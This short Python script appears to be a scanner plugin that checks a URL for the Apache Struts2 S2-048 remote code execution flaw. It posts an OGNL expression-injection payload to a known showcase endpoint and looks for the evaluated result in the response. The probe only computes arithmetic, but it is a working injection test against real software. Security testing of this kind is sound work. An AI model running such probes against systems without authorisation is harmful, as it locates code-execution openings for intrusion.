import requests
import re
import urllib


def verify(url):
    relsult = {
        'name': 'S2-048 Remote Code Execution Vulnerablity',
        'vulnerable': False
    }
    try:
        vulurl = urllib.parse.urljoin(url, '/integration/saveGangster.action')
        payload = r'''name=%24%7B1234*58614%7D&age=%24%7B233*233%7D&__checkbox_bustedBefore=true'''
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        req = requests.post(vulurl, headers=headers, timeout=3, data=payload)
        if '72329676' in req.text:
            relsult['vulnerable'] = True
            relsult['method'] = 'POST'
            relsult['url'] = vulurl
            relsult['position'] = 'data'
            relsult['payload'] = payload
            relsult['exp'] = True
        return relsult
    except:
        return relsult


